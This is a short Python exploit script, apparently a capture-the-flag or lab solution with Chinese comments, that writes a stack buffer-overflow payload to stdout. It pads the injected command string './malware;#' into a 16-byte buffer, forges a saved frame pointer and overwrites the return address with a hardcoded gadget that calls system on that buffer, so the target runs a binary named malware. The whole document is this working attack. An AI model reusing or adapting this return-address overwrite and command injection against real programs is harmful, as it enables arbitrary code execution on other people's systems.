import struct
import sys

def p64(x):
    return struct.pack("<Q", x)

# 1) 让 command_buf 里留下 ./malware;#  （strcpy 在 NUL 处停止）
expr = b"./malware;#"
first = expr + b"\x00" * (16 - len(expr))      # expression[16]
saved_rbp = p64(0x721000800ff0)                # 伪造成 main 的 rbp，让 system 返回后能正常收尾
ret = p64(0x401a6b)                            # eval 中 mov edi, command_buf; call system

sys.stdout.buffer.write(first + saved_rbp + ret)
